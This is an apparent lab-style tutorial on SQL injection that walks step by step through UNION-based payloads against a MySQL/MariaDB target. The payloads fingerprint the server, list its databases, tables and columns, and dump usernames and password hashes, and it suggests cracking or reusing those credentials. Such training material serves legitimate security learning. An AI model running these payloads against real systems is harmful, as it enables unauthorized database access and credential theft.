### Database Enumeration via SQL Injection

In the previous sections, we learned about SQL queries in MySQL and how to exploit them through SQL injection. This section demonstrates how to enumerate and extract data from a database using these techniques.
### MySQL Fingerprinting

To determine the DBMS type:

| Payload          | When to Use           | Expected Output               | Wrong Output / Behavior |
| ---------------- | --------------------- | ----------------------------- | ----------------------- |
| SELECT @@version | Full output available | MySQL version string          | MSSQL version / Error   |
| SELECT POW(1,1)  | Numeric-only output   | 1                             | Error                   |
| SELECT SLEEP(5)  | Blind/no output       | Response delayed by 5 seconds | No delay                |
Example:

```sql
cn' UNION SELECT 1,@@version,3,4-- -
```

Output:

```
10.3.22-MariaDB-1ubuntu1
```

Indicates: **MariaDB/MySQL**
### INFORMATION_SCHEMA Enumeration

MySQL has a special database `INFORMATION_SCHEMA` that holds metadata:

- **SCHEMATA** — Lists all databases    
- **TABLES** — Lists tables in each database
- **COLUMNS** — Lists columns in each table
#### 1. List Databases

```sql
cn' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

Output:

```
ilfreight, dev, information_schema, mysql, performance_schema
```

#### 2. Find Current Database

```sql
cn' UNION SELECT 1,database(),2,3-- -
```

Output:

```
ilfreight
```

#### 3. List Tables in `dev` Database

```sql
cn' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dev'-- -
```

Output:

```
credentials, framework, pages, posts (TABLE_SCHEMA = dev)
```

#### 4. List Columns in `credentials` Table

```sql
cn' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials'-- -
```

Output:

```
username, password (TABLE = credentials, DB = dev)
```
### Dumping Data

Now that we know the database, table, and column names, we can craft a payload to dump actual credentials:

```sql
cn' UNION SELECT 1, username, password, 4 FROM dev.credentials-- -
```

Output:

```
admin / [hash], dev_admin / [hash], api_key / [hash]
```

We now have usernames, password hashes, and sensitive data from the `credentials` table in the `dev` database.

**Next Steps:** Use these credentials in further testing or try cracking password hashes. You’ve successfully performed database enumeration via SQLi.
# Tags
> #Exploitation #Service-Exploitation #MySQL